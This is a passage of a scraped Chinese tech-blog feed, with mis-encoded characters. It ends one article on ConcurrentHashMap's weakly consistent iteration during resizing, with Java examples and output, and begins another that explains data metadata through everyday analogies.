        ConcurrentHashMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="hljs-number">4</span>, <span class="hljs-number">0.75f</span>);

        <span class="hljs-comment">// æ’å…¥è¶³å¤Ÿå¤šçš„å…ƒç´ ï¼Œç¡®ä¿ä¼šæ‰©å®¹</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            map.put(i, <span class="hljs-string">"value-"</span> + i);
        }

        <span class="hljs-comment">// è®°å½•æ‰€æœ‰éå†åˆ°çš„ key</span>
        List&lt;Integer&gt; traversedKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-comment">// è¾¹éå†è¾¹æ’å…¥ï¼Œè§¦å‘æ‰©å®¹</span>
        Iterator&lt;Integer&gt; it = map.keySet().iterator();
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (it.hasNext()) {
            <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> it.next();
            traversedKeys.add(key);
            count++;

            <span class="hljs-comment">// åœ¨éå†è¿‡ç¨‹ä¸­ç»§ç»­æ’å…¥ï¼Œå¯èƒ½è§¦å‘æ‰©å®¹</span>
            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">50</span>) {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; i &lt; <span class="hljs-number">200</span>; i++) {
                    map.put(i, <span class="hljs-string">"value-"</span> + i);
                }
                System.out.println(<span class="hljs-string">"éå†åˆ°ç¬¬50ä¸ªæ—¶æ’å…¥äº†100ä¸ªæ–°å…ƒç´ "</span>);
            }
        }

        System.out.println(<span class="hljs-string">"æœ€ç»ˆ map å¤§å°: "</span> + map.size());
        System.out.println(<span class="hljs-string">"éå†åˆ°çš„å…ƒç´ æ•°: "</span> + traversedKeys.size());

        <span class="hljs-comment">// éªŒè¯åŸå§‹100ä¸ªå…ƒç´ æ˜¯å¦éƒ½è¢«éå†åˆ°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">originalKeysTraversed</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            <span class="hljs-keyword">if</span> (traversedKeys.contains(i)) {
                originalKeysTraversed++;
            }
        }
        System.out.println(<span class="hljs-string">"åŸå§‹100ä¸ªkeyéå†åˆ°: "</span> + originalKeysTraversed + <span class="hljs-string">" ä¸ª"</span>);

        <span class="hljs-comment">// ç»Ÿè®¡æ–°æ’å…¥çš„å…ƒç´ æœ‰å¤šå°‘è¢«éå†åˆ°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">newKeysTraversed</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; i &lt; <span class="hljs-number">200</span>; i++) {
            <span class="hljs-keyword">if</span> (traversedKeys.contains(i)) {
                newKeysTraversed++;
            }
        }
        System.out.println(<span class="hljs-string">"æ–°æ’å…¥100ä¸ªkeyéå†åˆ°: "</span> + newKeysTraversed + <span class="hljs-string">" ä¸ªï¼ˆå¼±ä¸€è‡´æ€§ï¼Œå¯èƒ½éƒ¨åˆ†å¯è§ï¼‰"</span>);
    }
}
</code></pre>
<p><strong>è¿è¡Œè¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">=== 1. æ­£å¸¸éå†é¡ºåº ===
Map å†…å®¹: {<span class="hljs-attr">0</span>=v0, <span class="hljs-number">32</span>=v32, <span class="hljs-number">16</span>=v16, <span class="hljs-number">1</span>=v1, <span class="hljs-number">17</span>=v17, <span class="hljs-number">2</span>=v2}
éå†é¡ºåºï¼ˆæŒ‰æ¡¶ä½ï¼‰:
  <span class="hljs-attr">key</span>=<span class="hljs-number">0</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">0</span>)
  <span class="hljs-attr">key</span>=<span class="hljs-number">32</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">0</span>)
  <span class="hljs-attr">key</span>=<span class="hljs-number">16</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">0</span>)
  <span class="hljs-attr">key</span>=<span class="hljs-number">1</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">1</span>)
  <span class="hljs-attr">key</span>=<span class="hljs-number">17</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">1</span>)
  <span class="hljs-attr">key</span>=<span class="hljs-number">2</span> (æ¡¶ä½â‰ˆ<span class="hljs-number">2</span>)

=== 2. æ‰©å®¹æ—¶éå†é¡ºåºï¼ˆæ¨¡æ‹Ÿï¼‰ ===
æ‰©å®¹éå†åŸç†å›¾è§£ï¼š

ã€åœºæ™¯ã€‘å®¹é‡ 16 æ‰©å®¹åˆ° 32ï¼Œè¿­ä»£å™¨æ­£åœ¨éå†
...

=== 3. éªŒè¯æ‰©å®¹ä¸ä¸¢æ•°æ® ===
éå†åˆ°ç¬¬50ä¸ªæ—¶æ’å…¥äº†100ä¸ªæ–°å…ƒç´ 
æœ€ç»ˆ map å¤§å°: 200
éå†åˆ°çš„å…ƒç´ æ•°: 156
åŸå§‹100ä¸ªkeyéå†åˆ°: 100 ä¸ª
æ–°æ’å…¥100ä¸ªkeyéå†åˆ°: 56 ä¸ªï¼ˆå¼±ä¸€è‡´æ€§ï¼Œå¯èƒ½éƒ¨åˆ†å¯è§ï¼‰
</code></pre>
<h2 data-id="heading-24">å®æˆ˜å€Ÿé‰´</h2>
<h3 data-id="heading-25">è®¾è®¡æ€æƒ³ï¼šå¼±ä¸€è‡´æ€§æ¢é«˜æ€§èƒ½</h3>
<p><strong>æºç åšæ³•</strong>ï¼šæ”¾å¼ƒå¼ºä¸€è‡´æ€§ä¿è¯ï¼Œä¸åŠ å…¨å±€é”ï¼Œå…è®¸è¿­ä»£å™¨çœ‹åˆ°éƒ¨åˆ†å¹¶å‘ä¿®æ”¹ã€‚</p>
<p><strong>å€Ÿé‰´åœºæ™¯</strong>ï¼šç¼“å­˜éå†ã€ç›‘æ§æ•°æ®é‡‡é›†ç­‰å¯¹å®æ—¶æ€§è¦æ±‚ä¸é«˜çš„åœºæ™¯ã€‚</p>
<p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsCollector</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentHashMap&lt;String, Long&gt; metrics = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">MetricsCollector</span> <span class="hljs-variable">collector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MetricsCollector</span>();
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¹¶å‘æ›´æ–°</span>
        collector.metrics.put(<span class="hljs-string">"api.latency"</span>, <span class="hljs-number">100L</span>);
        collector.metrics.put(<span class="hljs-string">"api.count"</span>, <span class="hljs-number">1000L</span>);

        <span class="hljs-comment">// é‡‡é›†æ—¶å…è®¸å¼±ä¸€è‡´æ€§ï¼Œä¸å½±å“ä¸šåŠ¡é€»è¾‘</span>
        collector.collectSnapshot().forEach((k, v) -&gt;
            System.out.println(k + <span class="hljs-string">" = "</span> + v)
        );
    }

    <span class="hljs-comment">// é‡‡é›†å¿«ç…§ï¼Œå…è®¸å¼±ä¸€è‡´æ€§</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Long&gt; <span class="hljs-title function_">collectSnapshot</span><span class="hljs-params">()</span> {
        Map&lt;String, Long&gt; snapshot = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-comment">// éå†æœŸé—´çš„å¹¶å‘æ›´æ–°å¯èƒ½éƒ¨åˆ†å¯è§ï¼Œä½†ä¸å½±å“ç›‘æ§å‡†ç¡®æ€§</span>
        metrics.forEach(snapshot::put);
        <span class="hljs-keyword">return</span> snapshot;
    }
}
</code></pre>
<h3 data-id="heading-26">è®¾è®¡æ€æƒ³ï¼šä¸å¯å˜å¿«ç…§çš„æ›¿ä»£</h3>
<p><strong>æºç åšæ³•</strong>ï¼šä¸å¤åˆ¶æ•°æ®ï¼Œç›´æ¥éå†åº•å±‚ç»“æ„ã€‚</p>
<p><strong>å€Ÿé‰´åœºæ™¯</strong>ï¼šå½“å¤åˆ¶æˆæœ¬è¿‡é«˜æ—¶ï¼Œæ¥å—å¼±ä¸€è‡´æ€§æ¯”å¼ºåˆ¶å¤åˆ¶æ›´ä¼˜ã€‚</p>
<h2 data-id="heading-27">æ€»ç»“</h2>
<ul>
<li><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šå¼±ä¸€è‡´æ€§æ˜¯æ€§èƒ½ä¸ä¸€è‡´æ€§çš„æƒè¡¡ï¼Œè¿­ä»£å™¨ä¸åŠ é”ï¼Œå…è®¸å¹¶å‘ä¿®æ”¹éƒ¨åˆ†å¯è§</li>
<li><strong>å…³é”®æŠ€å·§</strong>ï¼š<code>baseIndex</code> å•å‘æ¨è¿› + <code>volatile</code> è¯»æ¡¶ä½å¤´èŠ‚ç‚¹ + æ‰©å®¹è·Ÿéš</li>
<li><strong>å®æˆ˜ä»·å€¼</strong>ï¼šç†è§£å¼±ä¸€è‡´æ€§è¾¹ç•Œï¼Œé¿å…åœ¨éœ€è¦å¼ºä¸€è‡´æ€§çš„åœºæ™¯è¯¯ç”¨ ConcurrentHashMap è¿­ä»£å™¨</li>
</ul>
<hr/>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨æˆ‘ï¼ŒæŒç»­åˆ†äº«é«˜è´¨é‡æŠ€æœ¯å¹²è´§ï¼ŒåŠ©ä½ æ›´å¿«æå‡ç¼–ç¨‹èƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ææ‡‚â€œå…ƒæ•°æ®â€ï¼šç»™æ•°æ®åŠä¸€å¼ â€œèº«ä»½è¯â€]]></title>    <link>https://juejin.cn/post/7582156219060387903</link>    <guid>https://juejin.cn/post/7582156219060387903</guid>    <pubDate>2025-12-11T07:07:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582156219060387903" data-draft-id="7582169248095059974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ææ‡‚â€œå…ƒæ•°æ®â€ï¼šç»™æ•°æ®åŠä¸€å¼ â€œèº«ä»½è¯â€"/> <meta itemprop="keywords" content="æ•°æ®åˆ†æ,æ•°æ®ç»“æ„"/> <meta itemprop="datePublished" content="2025-12-11T07:07:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ææ‡‚â€œå…ƒæ•°æ®â€ï¼šç»™æ•°æ®åŠä¸€å¼ â€œèº«ä»½è¯â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:07:28.000Z" title="Thu Dec 11 2025 07:07:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦ç»å†è¿‡è¿™æ ·çš„åœºæ™¯ï¼š</p>
<p>åŒäº‹å‘ç»™ä½ ä¸€ä¸ª <code>Excel</code> è¡¨æ ¼ï¼Œæ–‡ä»¶åå« <code>data_final_v2.xlsx</code>ã€‚</p>
<p>ä½ æ»¡æ€€æœŸå¾…åœ°æ‰“å¼€ï¼Œç»“æœå‘ç°ï¼š</p>
<ul>
<li>è¡¨å¤´æ˜¯ cryptic çš„è‹±æ–‡ç¼©å†™ï¼ˆå¦‚ <code>c_amt</code>, <code>usr_stat</code>ï¼‰ï¼›</li>
<li>æœ‰ä¸€åˆ—å…¨æ˜¯æ•°å­— <code>1, 0, 1, 0</code>ï¼Œä½ çŒœä¸å‡ºè¿™ä»£è¡¨â€œç”·å¥³â€è¿˜æ˜¯â€œæ˜¯å¦æ´»è·ƒâ€ï¼›</li>
<li>ä½ æ ¹æœ¬ä¸çŸ¥é“è¿™ä»½æ•°æ®æ˜¯ä»Šå¤©çš„ï¼Œè¿˜æ˜¯ä¸Šä¸ªæœˆçš„è¿‡æœŸæ•°æ®ã€‚</li>
</ul>
<p>è¿™æ—¶å€™ï¼Œä½ é¢å¯¹ç€ä¸€å¤§å †æ•°æ®ï¼Œå´æ„Ÿåˆ°ä¸¤çœ¼ä¸€æŠ¹é»‘ã€‚</p>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºè¿™ä»½æ•°æ®ç¼ºå°‘äº†â€œå…ƒæ•°æ®â€ã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠæ•°æ®åˆ†æä¸­è¿™ä¸ªè‡³å…³é‡è¦ï¼Œå´å¸¸è¢«å¿½è§†çš„æ¦‚å¿µ---<strong>å…ƒæ•°æ®</strong>ï¼ˆ<code>Metadata</code>ï¼‰ã€‚</p>
<h2 data-id="heading-0">1. ä»€ä¹ˆæ˜¯å…ƒæ•°æ®ï¼Ÿ</h2>
<p>åœ¨æ•™ç§‘ä¹¦é‡Œï¼Œå…ƒæ•°æ®çš„å®šä¹‰åªæœ‰å†·å†°å†°çš„ä¸€å¥è¯ï¼š<strong>â€œæè¿°æ•°æ®çš„æ•°æ®â€</strong>ï¼ˆ<code>Data about Data</code>ï¼‰ã€‚</p>
<p>å¬èµ·æ¥æœ‰ç‚¹ç»•ï¼Ÿæ²¡å…³ç³»ï¼Œæˆ‘ä»¬ç”¨ç”Ÿæ´»ä¸­çš„ä¾‹å­æ¥ç†è§£ã€‚</p>
<ol>
<li>å¬æ­Œè½¯ä»¶çš„ä¾‹å­</li>
</ol>
<p>å½“ä½ åœ¨æ‰‹æœºä¸Šå¬ä¸€é¦– MP3 éŸ³ä¹æ—¶ï¼š</p>
<ul>
<li><strong>æ•°æ®</strong>ï¼ˆ<code>Data</code>ï¼‰ï¼šæ˜¯ä½ å¬åˆ°çš„å£°éŸ³æ—‹å¾‹ã€‚</li>
<li><strong>å…ƒæ•°æ®</strong>ï¼ˆ<code>Metadata</code>ï¼‰ï¼šæ˜¯å±å¹•ä¸Šæ˜¾ç¤ºçš„æ­Œåã€æ­Œæ‰‹ã€ä¸“è¾‘å°é¢ã€æ—¶é•¿ã€æ–‡ä»¶å¤§å°ï¼ˆ3MBï¼‰ã€‚</li>
</ul>
<p>å¦‚æœæ²¡æœ‰å…ƒæ•°æ®ï¼Œä½ çš„æ­Œå•é‡Œå°±æ˜¯ä¸€å † <code>track01.mp3</code>, <code>track02.mp3</code>ï¼Œä½ æ ¹æœ¬ä¸çŸ¥é“è¯¥ç‚¹å“ªé¦–ã€‚</p>
<ol start="2">
<li>å¯ä¹çš„ä¾‹å­</li>
</ol>
<p>ä½ å»ä¾¿åˆ©åº—ä¹°ä¸€ç“¶å¯ä¹ï¼š</p>
<ul>
<li><strong>æ•°æ®</strong>ï¼ˆ<code>Data</code>ï¼‰ï¼šç“¶å­é‡Œé»‘è‰²çš„æ¶²ä½“ï¼ˆæˆ‘ä»¬è¦å–çš„ä¸œè¥¿ï¼‰ã€‚</li>
<li><strong>å…ƒæ•°æ®</strong>ï¼ˆ<code>Metadata</code>ï¼‰ï¼šç“¶èº«ä¸Šçš„æ ‡ç­¾â€”â€”é…æ–™è¡¨ï¼ˆå«ç³–é‡ï¼‰ã€ç”Ÿäº§æ—¥æœŸã€ä¿è´¨æœŸã€å‡€å«é‡ï¼ˆ500mlï¼‰ã€‚</li>
</ul>
<p><strong>æ€»ç»“ä¸€ä¸‹</strong>ï¼š
å¦‚æœæŠŠâ€œæ•°æ®â€æ¯”ä½œâ€œè´§ç‰©â€ï¼Œé‚£ä¹ˆâ€œå…ƒæ•°æ®â€å°±æ˜¯æŒ‚åœ¨è´§ç‰©ä¸Šçš„æ ‡ç­¾æˆ–è¯´æ˜ä¹¦ã€‚</p>
<p>å®ƒä¸ç›´æ¥å‘Šè¯‰ä½ æ•°æ®çš„å†…å®¹ï¼ˆæ¯”å¦‚å…·ä½“çš„é”€å”®é¢æ˜¯å¤šå°‘ï¼‰ï¼Œä½†å®ƒå‘Šè¯‰ä½ è¿™ä¸²æ•°å­—ä»£è¡¨ä»€ä¹ˆã€ä»å“ªæ¥ã€æ˜¯ä¸æ˜¯å¯é ã€‚</p>
<h2 data-id="heading-1">2. å…ƒæ•°æ®æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2>
<p>å¦‚æœä½ æ˜¯ä¸€åæ•°æ®åˆ†æå¸ˆï¼Œæˆ–è€…å·¥ä½œä¸­ç»å¸¸å’ŒæŠ¥è¡¨æ‰“äº¤é“ï¼Œå…ƒæ•°æ®å°±æ˜¯ä½ çš„æ•‘å‘½ç¨»è‰ã€‚</p>
<p>å®ƒçš„ä»·å€¼ä¸»è¦ä½“ç°åœ¨ä¸‰ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li><strong>è®©ä½ èƒ½â€œçœ‹æ‡‚â€æ•°æ®</strong>ï¼ˆ<strong>è§£é‡Šæ€§</strong>ï¼‰ï¼šä½ åœ¨æ•°æ®åº“é‡Œçœ‹åˆ°ä¸€ä¸ªå­—æ®µå« <code>revenue</code>ï¼ˆæ”¶å…¥ï¼‰ï¼Œæ•°å€¼æ˜¯ 100ã€‚æ˜¯äººæ°‘å¸è¿˜æ˜¯ç¾å…ƒï¼Ÿæ˜¯å«ç¨æ”¶å…¥è¿˜æ˜¯å‡€æ”¶å…¥ï¼Ÿ
<ul>
<li>æ²¡æœ‰å…ƒæ•°æ®ï¼šå…¨é çŒœï¼Œæˆ–è€…æ‰“ç”µè¯é—®ç¦»èŒçš„åŒäº‹ã€‚</li>
<li>æœ‰å…ƒæ•°æ®ï¼šæ•°æ®å­—å…¸é‡Œæ¸…æ¥šå†™ç€ï¼šâ€œ<code>revenue</code>ï¼šå«ç¨é”€å”®æ€»é¢ï¼Œå•ä½ï¼šäººæ°‘å¸ï¼ˆå…ƒï¼‰â€ã€‚</li>
</ul>
</li>
<li><strong>è®©ä½ èƒ½â€œæ‰¾åˆ°â€æ•°æ®</strong>ï¼ˆ<strong>æ£€ç´¢æ€§</strong>ï¼‰ï¼šè€æ¿è®©ä½ åˆ†æâ€œå»å¹´åŒåä¸€çš„ç”¨æˆ·æµå¤±ç‡â€ã€‚
<ul>
<li>æ²¡æœ‰å…ƒæ•°æ®ï¼šä½ è¦ç¿»éå…¬å¸å‡ ç™¾å¼ è¡¨ï¼Œæ‰“å¼€ä¸€ä¸ªä¸ªçœ‹ã€‚</li>
<li>æœ‰å…ƒæ•°æ®ï¼šåœ¨ç³»ç»Ÿé‡Œæœç´¢â€œæµå¤±ç‡â€ï¼Œé©¬ä¸Šå¼¹å‡ºç›¸å…³çš„è¡¨å’Œå­—æ®µã€‚</li>
</ul>
</li>
<li><strong>è®©ä½ æ•¢â€œä¿¡ä»»â€æ•°æ®</strong>ï¼ˆ<strong>æº¯æºæ€§</strong>ï¼‰ï¼šæŠ¥è¡¨ä¸Šçš„æ•°å­—çªç„¶è·Œäº†50%ï¼Œæ˜¯ä¸šåŠ¡å‡ºé—®é¢˜äº†ï¼Œè¿˜æ˜¯æ•°æ®æ²¡æ›´æ–°ï¼Ÿ
<ul>
<li>æ²¡æœ‰å…ƒæ•°æ®ï¼šæ€€ç–‘äººç”Ÿï¼Œåˆ°å¤„æ’æŸ¥ã€‚</li>
